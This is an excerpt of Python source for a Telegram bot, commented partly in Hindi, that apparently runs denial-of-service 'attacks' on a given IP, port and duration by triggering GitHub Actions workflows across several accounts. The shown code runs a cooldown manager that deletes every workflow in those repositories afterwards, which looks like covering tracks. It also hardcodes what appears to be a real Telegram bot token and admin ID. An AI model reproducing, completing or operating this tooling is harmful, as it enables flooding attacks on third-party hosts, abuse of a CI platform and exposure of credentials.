...
TELEGRAM_TOKEN = "7649830476:AAEUz97RQIi6O35F1yzLOcN4mEGE80khlqE"
ADMIN_ID = 5820236233
...
# 🔥🔥🔥 NEW FUNCTION: DELETE ALL WORKFLOWS 🔥🔥🔥
async def delete_all_workflows():
    """Cooldown खत्म होने पर सभी running workflows DELETE करेगा"""
    deleted_count = 0
    tasks = []
    ...
    async with aiohttp.ClientSession() as session:
        for account in GITHUB_ACCOUNTS:
            token = account['token']
            for repo in account['repos']:
                task = asyncio.create_task(delete_repo_workflows(session, token, repo))
                tasks.append(task)
...
async def delete_repo_workflows(session, token, repo):
    """एक repository के सभी workflows DELETE करेगा"""
    try:
        ...
        print(f"⚠️ Error deleting workflows for {repo}: {e}")
        return 0

# 🔥🔥🔥 FIXED COOLDOWN MANAGER (NO RUNTIME WARNING) 🔥🔥🔥
async def manage_cooldown():
    """Manage cooldown in background और cooldown खत्म होने पर workflows DELETE करेगा"""
        ...
        try:
            if is_cooldown_active:
                ...
                if current_time >= cooldown_end_time:
                    ...
                    # Run deletion logic
                    deleted_count = await delete_all_workflows()
                    
                    if application and not COOLDOWN_NOTIFICATION_SENT:
                        try:
                            await application.bot.send_message(
                                chat_id=ADMIN_ID,
                                text=f"✅ *COOLDOWN COMPLETE!*\n\n"
                                     f"⚡ Bot is now ready for new attacks!\n"
                                     f"🗑️ Deleted {deleted_count} old workflows\n\n"
                                     f"🎯 Use `/attack <ip> <port> <time>`\n"
                                     f"📊 Check status with `/ping`",
                                parse_mode="Markdown"
                            )
                            COOLDOWN_NOTIFICATION_SENT = True
                            print(f"✅ Cooldown finished! Deleted {deleted_count} workflows")
                        except Exception as e:
                            print(f"⚠️ Failed to send notification: {e}")
            
            # This sleep is crucial to prevent the loop from eating 100% CPU
            await asyncio.sleep(5) 
        except Exception as e:
            print(f"Error in cooldown manager: {e}")
...
🗑️ OLD WORKFLOWS: Auto-delete after cooldown
...
async def execute_attack(update, ip, port, duration):
    ...
    try:
        ...
        await update.message.reply_text(
            ...
            f"🗑️ Old workflows will auto-DELETE after cooldown\n\n"
...
# 🔥🔥🔥 FIXED POST_INIT FUNCTION 🔥🔥🔥
async def post_init(application_instance):
    """This runs inside the event loop once it starts."""
    asyncio.create_task(manage_cooldown())
    print("✅ Background Cooldown Manager Started!")
...
def main():
    ...
    ║    ✅ AUTO DELETE WORKFLOWS ON COOLDOWN END   ║
    ...
    ║    🗑️ Auto-delete workflows: ✅ ENABLED      ║
    ╚══════════════════════════════════════════════╝
    """.format(
        len(GITHUB_ACCOUNTS), 
    ...
    # ✅ FIXED: Initialize with post_init
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).post_init(post_init).build()
    
    # ✅ REMOVED: asyncio.create_task(manage_cooldown()) - NO LONGER NEEDED
    ...
    print("✅ Bot started with auto-delete workflows feature!")
    print("✅ Runtime warnings fixed!")
